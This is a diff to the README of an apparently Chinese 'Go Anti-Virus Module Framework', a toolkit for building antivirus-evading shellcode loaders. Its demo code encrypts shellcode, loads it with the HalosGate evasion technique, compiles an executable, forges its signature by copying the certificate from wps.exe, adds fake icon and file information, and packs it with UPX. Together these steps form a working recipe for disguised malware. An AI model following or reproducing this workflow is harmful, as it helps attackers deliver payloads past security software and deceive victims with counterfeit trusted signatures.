@@ -15,9 +15,11 @@ Go Anti-Virus Module Framework
 ### 更新日志
 
 1. 模块化配置
-2. 编译功能更新
-3. 渲染功能更新
-4. 压缩功能更新
+2. 模板渲染
+3. 编译控制
+4. UPX压缩
+5. 签名伪造
+6. 添加图标文件信息
 
 ## Demo
 
@@ -26,7 +28,6 @@ package main
 
 import (
 	"fmt"
-	"path/filepath"
 	"strings"
 	"variant/build"
 	"variant/crypto"
@@ -45,7 +46,7 @@ func main() {
 		IvValue:    rand.LStrings(16),
 		CipherText: rand.RStrings(),
 		PlainText:  rand.RStrings(),
-		Decrypt:    "XorAesHexBase85Decrypt",
+		Decrypt:    "XorSm4HexBase85Decrypt",
 		Loader:     "HalosGate",
 	}
 
@@ -56,7 +57,7 @@ func main() {
 		IV:        []byte(data.IvValue),
 	}
 	// 加密之后的 shellcode
-	tmp, err := params.SignSetKeyIV(crypto.XorAesHexBase85Encrypt)
+	tmp, err := params.SignSetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -79,7 +80,7 @@ func main() {
 	cOpts := build.CompileOpts{
 		GoFileName:  tOpts.OutputGoName,
 		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
-		HideConsole: true,
+		HideConsole: false,
 		CompilePath: "output",
 	}
 	// 编译
@@ -87,20 +88,56 @@ func main() {
 		log.Fatal(err)
 	}
 
+	// 添加图标和文件信息
+	err = cOpts.Winres()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 伪造证书配置
+	sOpts := build.SignOpts{
+		SignPath: "output",
+		UnSign:   cOpts.ExeFileName,
+		Signed:   "signed_" + cOpts.ExeFileName,
+		Cert:     "wps.der",
+		Thief:    "wps.exe",
+		DstCert:  "wps.der",
+	}
+
+	// 保存证书
+	err = sOpts.SaveCert()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 利用EXE进行签名伪造
+	err = sOpts.ExeThief()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 利用证书进行签名伪造
+	err = sOpts.CertThief()
+	if err != nil {
+		log.Fatal(err)
+	}
+
 	// 压缩参数
 	upx := build.UpxOpts{
-		Level:  "-9",
-		Keep:   true,
-		Force:  true,
-		SrcExe: filepath.Join("output", cOpts.ExeFileName),
+		Level:   "-9",
+		Keep:    true,
+		Force:   true,
+		SrcExe:  cOpts.ExeFileName,
+		UpxPath: "output",
 	}
+
 	// 压缩
 	err = upx.UpxPacker()
 	if err != nil {
 		log.Warn(err)
 	}
-}
 
+}
 ```
 
 ### Thanks
